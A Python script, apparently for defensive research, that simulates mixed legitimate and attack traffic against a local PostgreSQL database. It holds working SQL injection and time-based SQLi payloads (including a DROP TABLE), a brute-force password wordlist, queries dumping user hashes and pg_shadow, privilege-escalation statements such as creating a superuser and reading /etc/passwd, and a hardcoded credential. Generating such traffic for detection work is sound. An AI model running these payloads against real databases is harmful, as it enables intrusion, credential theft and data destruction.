"""
BD Simulator - Attack Pattern Traffic Generator
Educational / Defensive Security Research Only

Simulates mixed legitimate + malicious query traffic against local PostgreSQL.
Attack types: SQL Injection, Brute Force, Exfiltration, Privilege Escalation,
              Enumeration, Time-based SQLi
"""

import psycopg2
import psycopg2.extras
import random
import time
import logging
import sys
from datetime import datetime

# ── Config ────────────────────────────────────────────────────
DB = {
    "host":     "localhost",
    "port":     5432,
    "dbname":   "appdb",
    "user":     "appuser",
    "password": "S3cur3P@ss2024!",
}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("simulator.log", encoding="utf-8"),
    ],
)
log = logging.getLogger("simulator")


# ── DB Helpers ────────────────────────────────────────────────

def connect():
    return psycopg2.connect(**DB)


def run_query(query: str, params=None, label: str = ""):
    """Execute query, log result/error, swallow exceptions so simulation continues."""
    try:
        with connect() as conn:
            conn.autocommit = True
            with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
                cur.execute(query, params)
                try:
                    rows = cur.fetchall()
                    log.info(f"[{label}] OK — {len(rows)} rows")
                    return rows
                except Exception:
                    log.info(f"[{label}] OK — no rows")
                    return []
    except psycopg2.Error as e:
        log.warning(f"[{label}] DB ERROR: {e.pgcode} — {str(e).strip()}")
        return None


# ── Normal App Flow ───────────────────────────────────────────

USERS = ["alice", "bob", "charlie"]

def normal_login(username: str):
    """Parameterised login — safe."""
    query = "SELECT id, role FROM users WHERE username = %s AND password_hash != ''"
    run_query(query, (username,), label="NORMAL/login")

def normal_browse_products():
    run_query("SELECT id, name, price FROM products WHERE stock > 0", label="NORMAL/products")

def normal_user_orders(user_id: int):
    run_query(
        "SELECT o.id, p.name, o.total FROM orders o JOIN products p ON p.id=o.product_id WHERE o.user_id=%s",
        (user_id,),
        label="NORMAL/orders",
    )

def normal_flow():
    user = random.choice(USERS)
    uid  = random.randint(2, 4)
    normal_login(user)
    time.sleep(random.uniform(0.1, 0.4))
    normal_browse_products()
    time.sleep(random.uniform(0.05, 0.2))
    normal_user_orders(uid)


# ── ATTACK: SQL Injection (Classic) ──────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT username,password_hash,email FROM users--",
    "'; DROP TABLE orders;--",
    "' OR 'x'='x",
    "1' AND SLEEP(0)--",
    "' OR EXISTS(SELECT 1 FROM users WHERE role='admin')--",
    "' AND 1=2 UNION ALL SELECT table_name,null,null FROM information_schema.tables--",
]

def attack_sqli():
    payload = random.choice(SQLI_PAYLOADS)
    log.warning(f"[ATTACK/SQLI] Payload: {payload!r}")
    # Intentionally unsafe string interpolation — this IS the attack simulation
    query = f"SELECT id, role FROM users WHERE username = '{payload}'"
    run_query(query, label="ATTACK/SQLI")


# ── ATTACK: Brute Force ───────────────────────────────────────

WORDLIST = [
    "password", "123456", "admin", "letmein", "qwerty",
    "password1", "admin123", "root", "toor", "abc123",
    "welcome", "monkey", "dragon", "master", "login",
]
BF_TARGETS = ["admin", "alice", "bob", "root", "administrator"]

def attack_brute_force():
    target = random.choice(BF_TARGETS)
    attempts = random.randint(3, 8)
    log.warning(f"[ATTACK/BRUTE] Target: {target!r} — {attempts} attempts")
    for pwd in random.sample(WORDLIST, min(attempts, len(WORDLIST))):
        query = f"SELECT id FROM users WHERE username='{target}' AND password_hash='{pwd}'"
        run_query(query, label="ATTACK/BRUTE")
        time.sleep(random.uniform(0.05, 0.15))


# ── ATTACK: Data Exfiltration ────────────────────────────────

EXFIL_QUERIES = [
    "SELECT * FROM users",
    "SELECT username, password_hash, email, role FROM users",
    "SELECT * FROM orders",
    "SELECT u.username, u.email, u.role, o.total FROM users u JOIN orders o ON o.user_id=u.id",
    "COPY (SELECT * FROM users) TO STDOUT WITH CSV HEADER",
    "SELECT string_agg(username||':'||password_hash, chr(10)) FROM users",
    "SELECT * FROM pg_stat_activity",
    "SELECT usename, passwd FROM pg_shadow",
]

def attack_exfiltration():
    query = random.choice(EXFIL_QUERIES)
    log.warning(f"[ATTACK/EXFIL] Query: {query[:80]!r}")
    run_query(query, label="ATTACK/EXFIL")


# ── ATTACK: Privilege Escalation ─────────────────────────────

PRIVESC_QUERIES = [
    "ALTER USER appuser WITH SUPERUSER",
    "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO appuser",
    "CREATE USER hacker WITH SUPERUSER PASSWORD 'hacked'",
    "GRANT pg_read_all_data TO appuser",
    "UPDATE users SET role='admin' WHERE username='alice'",
    "SELECT pg_read_file('/etc/passwd')",
    "CREATE EXTENSION IF NOT EXISTS dblink",
    "SELECT * FROM pg_roles WHERE rolsuper=true",
]

def attack_privilege_escalation():
    query = random.choice(PRIVESC_QUERIES)
    log.warning(f"[ATTACK/PRIVESC] Query: {query!r}")
    run_query(query, label="ATTACK/PRIVESC")


# ── ATTACK: Enumeration ───────────────────────────────────────

ENUM_QUERIES = [
    "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
    "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'",
    "SELECT version()",
    "SELECT current_user, session_user",
    "SELECT current_database()",
    "SELECT rolname, rolsuper FROM pg_roles",
    "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')",
    "SELECT nspname FROM pg_namespace",
    "SELECT pg_postmaster_start_time()",
    "SELECT setting FROM pg_settings WHERE name='data_directory'",
    "SELECT usename, usecreatedb, usecreaterole FROM pg_user",
]

def attack_enumeration():
    query = random.choice(ENUM_QUERIES)
    log.warning(f"[ATTACK/ENUM] Query: {query!r}")
    run_query(query, label="ATTACK/ENUM")


# ── ATTACK: Time-Based SQLi ───────────────────────────────────

TIME_PAYLOADS = [
    "'; SELECT pg_sleep(2);--",
    "' OR pg_sleep(1)=0--",
    "1; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--",
    "' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users LIMIT 1)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(1))--",
    "'; SELECT CASE WHEN (role='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE id=1;--",
]

def attack_time_based_sqli():
    payload = random.choice(TIME_PAYLOADS)
    log.warning(f"[ATTACK/TIME-SQLI] Payload: {payload!r}")
    query = f"SELECT id FROM users WHERE username='victim{payload}'"
    run_query(query, label="ATTACK/TIME-SQLI")


# ── Simulation Loop ───────────────────────────────────────────

ATTACK_REGISTRY = [
    ("SQL Injection",          attack_sqli,                  0.15),
    ("Brute Force",            attack_brute_force,           0.12),
    ("Exfiltration",           attack_exfiltration,          0.10),
    ("Privilege Escalation",   attack_privilege_escalation,  0.08),
    ("Enumeration",            attack_enumeration,           0.10),
    ("Time-based SQLi",        attack_time_based_sqli,       0.08),
]

# Combined weight for any attack triggering in a given iteration
ATTACK_PROBABILITY = sum(w for _, _, w in ATTACK_REGISTRY)
NORMAL_PROBABILITY = 1.0 - ATTACK_PROBABILITY  # ~0.37 normal


def pick_and_run_attack():
    r = random.random() * ATTACK_PROBABILITY
    cumulative = 0.0
    for name, fn, weight in ATTACK_REGISTRY:
        cumulative += weight
        if r <= cumulative:
            fn()
            return name
    ATTACK_REGISTRY[-1][1]()
    return ATTACK_REGISTRY[-1][0]


def main():
    log.info("=" * 60)
    log.info("BD Simulator started — mixed traffic mode")
    log.info(f"Attack probability per cycle: {ATTACK_PROBABILITY*100:.0f}%")
    log.info("Press Ctrl+C to stop")
    log.info("=" * 60)

    iteration = 0
    try:
        while True:
            iteration += 1
            log.info(f"--- Cycle {iteration} ---")

            roll = random.random()
            if roll < NORMAL_PROBABILITY:
                log.info("[FLOW] normal app traffic")
                normal_flow()
            else:
                attack_name = pick_and_run_attack()
                log.warning(f"[FLOW] attack simulated: {attack_name}")

            sleep_time = random.uniform(0.5, 2.5)
            log.info(f"[SLEEP] {sleep_time:.2f}s")
            time.sleep(sleep_time)

    except KeyboardInterrupt:
        log.info(f"Simulation stopped after {iteration} cycles.")


if __name__ == "__main__":
    main()
